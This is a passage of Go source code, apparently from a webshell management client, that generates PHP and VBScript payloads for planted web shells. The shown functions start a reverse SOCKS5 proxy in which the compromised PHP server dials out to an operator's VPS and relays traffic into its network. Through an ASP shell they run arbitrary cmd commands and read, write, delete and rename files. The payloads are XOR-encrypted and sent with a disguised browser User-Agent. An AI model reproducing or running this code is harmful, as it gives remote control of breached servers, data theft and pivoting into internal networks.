		"foreach(array_keys($_SESSION) as $_k){\n" +
		"  if(strpos($_k,'reverseportmap_socket_'.$_lp.'_')===0)unset($_SESSION[$_k]);\n}\n" +
		"session_write_close();\n" +
		"echo json_encode(['status'=>'200','msg'=>base64_encode('ok')]);\n"
	_, err := a.send(code)
	return err
}

// ─── RemoteSocksProxy（PHP 主动连出，Go 作为 VPS）──────────────────────────────

// RemoteSocksCreate 让 PHP 主动连接 VPS (remoteIP:remotePort)，PHP 在后台作 SOCKS5 服务端。
// Go 侧需同时运行 RemoteSocksServer（见 proxy.go）监听 remotePort。
func (a *Agent) RemoteSocksCreate(remoteIP string, remotePort int) error {
	ipB64 := base64.StdEncoding.EncodeToString([]byte(remoteIP))
	portStr := fmt.Sprintf("%d", remotePort)
	portB64 := base64.StdEncoding.EncodeToString([]byte(portStr))
	okB64 := base64.StdEncoding.EncodeToString([]byte("ok"))
	src := "@error_reporting(0);\n@set_time_limit(0);\n@ignore_user_abort(1);\n@session_start();\n" +
		"$_SESSION['remotesocks_running']=true;\n" +
		"session_write_close();\n" +
		"@ob_end_clean();\n" +
		"$_resp='{\"status\":\"200\",\"msg\":\"" + okB64 + "\"}';\n" +
		"header('Content-Type: application/json');\n" +
		"header('Connection: close');\n" +
		"header('Content-Length: '.strlen($_resp));\n" +
		"echo $_resp;flush();\n" +
		"$_rip=base64_decode('" + ipB64 + "');\n" +
		"$_rp=(int)base64_decode('" + portB64 + "');\n" +
		`function _parseSocks5($_s){
  $_buf=fread($_s,2);if(strlen($_buf)<2)return null;
  $_nauth=ord($_buf[1]);
  fread($_s,$_nauth);
  fwrite($_s,"\x05\x00");
  $_req=fread($_s,4);if(strlen($_req)<4)return null;
  $_atyp=ord($_req[3]);
  switch($_atyp){
    case 1:$_host=inet_ntop(fread($_s,4));break;
    case 3:$_l=ord(fread($_s,1));$_host=fread($_s,$_l);break;
    case 4:$_host=inet_ntop(fread($_s,16));break;
    default:return null;
  }
  $_pb=fread($_s,2);$_port=(ord($_pb[0])<<8)|ord($_pb[1]);
  return [$_host,$_port];
}
` +
		"while(true){\n" +
		"  @session_start();\n" +
		"  $_run=isset($_SESSION['remotesocks_running'])?$_SESSION['remotesocks_running']:false;\n" +
		"  session_write_close();\n" +
		"  if(!$_run)break;\n" +
		"  $_outer=@stream_socket_client(\"tcp://{$_rip}:{$_rp}\");\n" +
		"  if(!$_outer){usleep(3000000);continue;}\n" +
		"  stream_set_blocking($_outer,true);\n" +
		"  $_target=_parseSocks5($_outer);\n" +
		"  if(!$_target){fclose($_outer);continue;}\n" +
		"  $_inner=@stream_socket_client(\"tcp://{$_target[0]}:{$_target[1]}\");\n" +
		"  if(!$_inner){fwrite($_outer,\"\\x05\\x05\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\");fclose($_outer);continue;}\n" +
		"  fwrite($_outer,\"\\x05\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\");\n" +
		"  stream_set_blocking($_outer,false);\n" +
		"  stream_set_blocking($_inner,false);\n" +
		"  while(true){\n" +
		"    $_r=[$_outer,$_inner];$_w=null;$_e=null;\n" +
		"    if(@stream_select($_r,$_w,$_e,0,200000)===false)break;\n" +
		"    if(in_array($_outer,$_r)){$_d=fread($_outer,4096);if($_d===false||$_d==='')break;fwrite($_inner,$_d);}\n" +
		"    if(in_array($_inner,$_r)){$_d=fread($_inner,4096);if($_d===false||$_d==='')break;fwrite($_outer,$_d);}\n" +
		"  }\n" +
		"  fclose($_outer);fclose($_inner);\n" +
		"}\n"
	_, err := a.send(src)
	return err
}

// RemoteSocksStop 停止 PHP 侧 RemoteSocksProxy 后台循环。
func (a *Agent) RemoteSocksStop() error {
	code := `@session_start();$_SESSION['remotesocks_running']=false;session_write_close();echo json_encode(['status'=>'200','msg'=>base64_encode('ok')]);`
	_, err := a.send(code)
	return err
}

// ─── ASP (VBScript) 主动连接实现 ──────────────────────────────────────────────
//
// ASP Shell 使用 XOR 加密（与 Go 的 xorCrypt 一致），执行 VBScript payload，
// 通过 Response.Write 输出 JSON {"status":"200","msg":"base64(result)"}。
// B64Enc/B64Dec 利用 MSXML DOMDocument + ADODB.Stream 实现，无需额外依赖。

const vbsHelper = `On Error Resume Next
Function EscStr(s)
  s=Replace(s,"\","\\"):s=Replace(s,Chr(34),"\""")
  EscStr=s
End Function
Function B64Enc(s)
  Dim x,n,b:Set x=CreateObject("Msxml2.DOMDocument.3.0"):Set n=x.createElement("b")
  n.dataType="bin.base64":Set b=CreateObject("ADODB.Stream")
  b.Type=2:b.Charset="utf-8":b.Open:b.WriteText s
  b.Position=0:b.Type=1:b.Position=3:n.nodeTypedValue=b.Read:b.Close
  B64Enc=Replace(n.Text,Chr(10),""):Set b=Nothing:Set n=Nothing:Set x=Nothing
End Function
Function B64EncBin(data)
  Dim x,n:Set x=CreateObject("Msxml2.DOMDocument.3.0"):Set n=x.createElement("b")
  n.dataType="bin.base64":n.nodeTypedValue=data
  B64EncBin=Replace(n.Text,Chr(10),""):Set n=Nothing:Set x=Nothing
End Function
Function B64Dec(s)
  Dim x,n,b:Set x=CreateObject("Msxml2.DOMDocument.3.0"):Set n=x.createElement("b")
  n.dataType="bin.base64":n.Text=s:Set b=CreateObject("ADODB.Stream")
  b.Type=1:b.Open:b.Write n.nodeTypedValue:b.Position=0:b.Type=2:b.Charset="utf-8"
  B64Dec=b.ReadText:b.Close:Set b=Nothing:Set n=Nothing:Set x=Nothing
End Function
`

// sendASP 使用 XOR 加密 VBScript payload 并 POST 到 ASP shell，解析 JSON 响应。
func (a *Agent) sendASP(vbsCode string) (map[string]any, error) {
	body := xorCrypt(a.key, []byte(vbsCode))
	req, err := http.NewRequest("POST", a.url, bytes.NewReader(body))
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", "application/octet-stream")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	a.applyHeaders(req)
	resp, err := a.client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("ASP 连接失败: %w", err)
	}
	defer resp.Body.Close()
	raw, err := io.ReadAll(io.LimitReader(resp.Body, 4<<20))
	if err != nil {
		return nil, err
	}
	var result map[string]any
	if err := json.Unmarshal(raw, &result); err != nil {
		preview := raw
		if len(preview) > 256 {
			preview = preview[:256]
		}
		return nil, fmt.Errorf("ASP 响应解析失败（非 JSON）: %s", preview)
	}
	if status, _ := result["status"].(string); status != "200" {
		if msg, _ := result["msg"].(string); msg != "" {
			if d, e := base64.StdEncoding.DecodeString(msg); e == nil {
				return nil, fmt.Errorf("ASP shell 执行错误: %s", d)
			}
		}
		return nil, fmt.Errorf("ASP shell 返回非成功状态: %s", status)
	}
	return result, nil
}

func (a *Agent) aspGetInfo() (*SysInfo, error) {
	code := vbsHelper + `
Dim oSh,srv,usr,cwd,host,ip,j
Set oSh=CreateObject("WScript.Shell")
srv=Request.ServerVariables("SERVER_SOFTWARE")
usr=oSh.ExpandEnvironmentStrings("%USERNAME%")
cwd=oSh.CurrentDirectory
host=oSh.ExpandEnvironmentStrings("%COMPUTERNAME%")
ip=Request.ServerVariables("LOCAL_ADDR")
j="{""os"":""Windows"",""server"":""" & EscStr(srv) & """,""php"":"" "",""cwd"":""" & EscStr(cwd) & """,""user"":""" & EscStr(usr) & """,""hostname"":""" & EscStr(host) & """,""ip"":""" & EscStr(ip) & """}"
Response.Write "{""status"":""200"",""msg"":""" & B64Enc(j) & """}"
`
	result, err := a.sendASP(code)
	if err != nil {
		return nil, err
	}
	raw, err := decodeMsg(result)
	if err != nil {
		return nil, err
	}
	var info SysInfo
	if err := json.Unmarshal(raw, &info); err != nil {
		return nil, err
	}
	return &info, nil
}

func (a *Agent) aspExec(cmd string) (string, error) {
	cmdB64 := base64.StdEncoding.EncodeToString([]byte(cmd))
	code := vbsHelper + `
Dim cmd,oSh,tmpF,oFS,oStream,out
cmd=B64Dec("` + cmdB64 + `")
Set oSh=CreateObject("WScript.Shell")
tmpF=oSh.ExpandEnvironmentStrings("%TEMP%") & "\asp_out_" & Int(Rnd()*999999) & ".tmp"
oSh.Run "cmd /c " & cmd & " > """ & tmpF & """ 2>&1",0,True
Set oFS=CreateObject("Scripting.FileSystemObject")
If oFS.FileExists(tmpF) Then
  Set oStream=CreateObject("ADODB.Stream")
  oStream.Type=1:oStream.Open:oStream.LoadFromFile tmpF
  oStream.Position=0:oStream.Type=2:oStream.Charset="UTF-8"
  out=oStream.ReadText:oStream.Close
  oFS.DeleteFile tmpF
End If
Response.Write "{""status"":""200"",""msg"":""" & B64Enc(out) & """}"
`
	result, err := a.sendASP(code)
	if err != nil {
		return "", err
	}
	raw, err := decodeMsg(result)
	return string(raw), err
}

func (a *Agent) aspListDir(path string) ([]FileEntry, error) {
	pathB64 := base64.StdEncoding.EncodeToString([]byte(path))
	code := vbsHelper + `
Dim p,oFS,oDir,oItem,j
p=B64Dec("` + pathB64 + `")
Set oFS=CreateObject("Scripting.FileSystemObject")
Set oDir=oFS.GetFolder(p)
j="["
For Each oItem In oDir.SubFolders
  j=j&"{""name"":""" & EscStr(oItem.Name) & """,""isDir"":true,""size"":0,""mtime"":0,""perms"":""0755""},"
Next
For Each oItem In oDir.Files
  j=j&"{""name"":""" & EscStr(oItem.Name) & """,""isDir"":false,""size"":" & oItem.Size & ",""mtime"":0,""perms"":""0644""},"
Next
If Right(j,1)="," Then j=Left(j,Len(j)-1)
j=j&"]"
Response.Write "{""status"":""200"",""msg"":""" & B64Enc(j) & """}"
`
	result, err := a.sendASP(code)
	if err != nil {
		return nil, err
	}
	raw, err := decodeMsg(result)
	if err != nil {
		return nil, err
	}
	var files []FileEntry
	if err := json.Unmarshal(raw, &files); err != nil {
		return nil, err
	}
	if files == nil {
		files = []FileEntry{}
	}
	return files, nil
}

func (a *Agent) aspReadFile(path string) ([]byte, error) {
	pathB64 := base64.StdEncoding.EncodeToString([]byte(path))
	code := vbsHelper + `
Dim p,oStream
p=B64Dec("` + pathB64 + `")
Set oStream=CreateObject("ADODB.Stream")
oStream.Type=1:oStream.Open
oStream.LoadFromFile p
Dim raw:raw=oStream.Read:oStream.Close
Response.Write "{""status"":""200"",""msg"":""" & B64EncBin(raw) & """}"
`
	result, err := a.sendASP(code)
	if err != nil {
		return nil, err
	}
	return decodeMsg(result)
}

func (a *Agent) aspWriteFile(path string, content []byte) error {
	pathB64 := base64.StdEncoding.EncodeToString([]byte(path))
	dataB64 := base64.StdEncoding.EncodeToString(content)
	code := vbsHelper + `
Dim p,oXml,oNode,oStream
p=B64Dec("` + pathB64 + `")
Set oXml=CreateObject("Msxml2.DOMDocument.3.0"):Set oNode=oXml.createElement("b")
oNode.dataType="bin.base64":oNode.Text="` + dataB64 + `"
Set oStream=CreateObject("ADODB.Stream")
oStream.Type=1:oStream.Open:oStream.Write oNode.nodeTypedValue
oStream.SaveToFile p,2:oStream.Close
Response.Write "{""status"":""200"",""msg"":""" & B64Enc("ok") & """}"
`
	_, err := a.sendASP(code)
	return err
}

func (a *Agent) aspDeletePath(path string) error {
	pathB64 := base64.StdEncoding.EncodeToString([]byte(path))
	code := vbsHelper + `
Dim p,oFS
p=B64Dec("` + pathB64 + `")
Set oFS=CreateObject("Scripting.FileSystemObject")
If oFS.FolderExists(p) Then
  oFS.DeleteFolder p,True
ElseIf oFS.FileExists(p) Then
  oFS.DeleteFile p,True
End If
Response.Write "{""status"":""200"",""msg"":""" & B64Enc("ok") & """}"
`
	_, err := a.sendASP(code)
	return err
}

func (a *Agent) aspRenameFile(oldPath, newPath string) error {
	oldB64 := base64.StdEncoding.EncodeToString([]byte(oldPath))
	newB64 := base64.StdEncoding.EncodeToString([]byte(newPath))
	code := vbsHelper + `
Dim src,dst,oFS
src=B64Dec("` + oldB64 + `")
dst=B64Dec("` + newB64 + `")
Set oFS=CreateObject("Scripting.FileSystemObject")
If oFS.FolderExists(src) Then
  oFS.MoveFolder src,dst
ElseIf oFS.FileExists(src) Then
  oFS.MoveFile src,dst
End If
Response.Write "{""status"":""200"",""msg"":""" & B64Enc("ok") & """}"
`
	_, err := a.sendASP(code)
	return err
}

func (a *Agent) aspMkDir(path string) error {
	pathB64 := base64.StdEncoding.EncodeToString([]byte(path))
	code := vbsHelper + `
Dim p,oFS
p=B64Dec("` + pathB64 + `")
Set oFS=CreateObject("Scripting.FileSystemObject")
If Not oFS.FolderExists(p) Then oFS.CreateFolder p
Response.Write "{""status"":""200"",""msg"":""" & B64Enc("ok") & """}"
`
	_, err := a.sendASP(code)
	return err
}

func aspxShell(key16 string) string {
	return aspxShellDirect(key16)
}
